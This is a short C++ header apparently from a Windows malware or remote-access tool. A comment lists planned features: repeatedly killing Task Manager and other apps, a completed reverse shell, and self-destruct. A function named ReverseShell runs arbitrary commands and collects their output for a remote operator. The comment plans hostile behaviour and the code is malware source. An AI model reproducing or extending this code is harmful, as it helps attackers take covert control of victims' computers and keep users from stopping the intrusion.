/*
OTHER:
disable task manager (keep killing it) (need admin)
disable certain apps (keep killing, might need admin)
reverse shell [ok]
self destruct
*/

#include <iostream>
#include <memory>
#include <windows.h>

#pragma once

std::string ReverseShell(std::string command) {
    const int chunkSz = 4092;
    std::shared_ptr<FILE> pipe(popen(command.c_str(), "r"), pclose);
    char buffer[chunkSz];
    std::string res;
    while (!feof(pipe.get())) {
        if (fgets(buffer, chunkSz, pipe.get()) != NULL) {
            res += buffer;
        }
    }
    return res;
}